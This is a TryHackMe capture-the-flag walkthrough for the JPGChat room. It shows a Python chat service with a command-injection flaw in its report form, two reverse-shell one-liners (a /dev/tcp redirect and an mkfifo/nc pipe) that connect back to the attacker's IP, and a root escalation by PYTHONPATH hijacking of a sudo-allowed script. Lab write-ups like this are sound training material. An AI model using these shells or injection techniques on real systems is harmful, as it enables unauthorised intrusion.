---
title: Walkthrough - JPGChat
published: true
---

Tags: Python3, OS, Chatting, Report.
Description: Exploiting poorly made custom chatting service written in a certain language...
Difficulty: Easy
URL: [https://tryhackme.com/room/jpgchat](https://tryhackme.com/room/jpgchat)

* * *

## Notes

- `sudo nmap -sC -sV -sT --script vuln -O -p22,3000 10.10.237.128`

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
3000/tcp open  tcpwrapped
```

- `telnet 10.10.237.128 3000` lets us know we can find the service sourcecode at the github.
- [https://github.com/Mozzie-jpg/JPChat](https://github.com/Mozzie-jpg/JPChat)

```python
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

Using [REPORT] and then using `;` to end the function followed by a bash revshell `sh -i >& /dev/tcp/10.2.127.225/6666 0>&1` gets us our first shell. This shell isnt stable and doesnt seem to give us output but using `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.127.225 6667 >/tmp/f` gets us a more stable shell.

* * * 

## What is the content of user.txt?

![0xskar](/assets/jpgchat01.png)

* * * 

## What is the content of root.txt?

- `sudo -l` guartentee 

```
User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

So we only have read, access. Time to check out the source.

```
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

I then followed https://github.com/xnomas/TryHackMe-Writeups/tree/main/JPGchat because i dont know python.

```
(local) pwncat$ upload compare.py
./compare.py ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 375/375 bytes • ? • 0:00:00
[17:50:08] uploaded 375.00B in 1.96 seconds                                                                                    upload.py:76
(local) pwncat$                                                                                                                            
(remote) wes@ubuntu-xenial:/dev/shm$ ls -las
total 16
 0 drwxrwxrwt  2 root root    80 Aug 23 00:40 .
 0 drwxr-xr-x 16 root root  3560 Aug 23 00:09 ..
 4 -rw-r--r--  1 wes  wes    375 Aug 23 00:50 compare.py
12 -rw-------  1 wes  wes  12288 Aug 23 00:20 .compare.py.swp
(remote) wes@ubuntu-xenial:/dev/shm$ sudo PYTHONPATH=/dev/shm/ /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:/dev/shm# cd /root
root@ubuntu-xenial:/root# ls -las
total 24
4 drwx------  3 root root 4096 Jan 15  2021 .
4 drwxr-xr-x 25 root root 4096 Aug 23 00:09 ..
4 -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4 -rw-r--r--  1 root root  305 Jan 15  2021 root.txt
4 drwx------  2 root root 4096 Jan 15  2021 .ssh
root@ubuntu-xenial:/root# cat root.txt
[REDACTED]

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
root@ubuntu-xenial:/root# 
[18:24:02] warning: 10.10.225.187:58648: connection reset   
```

* * * 

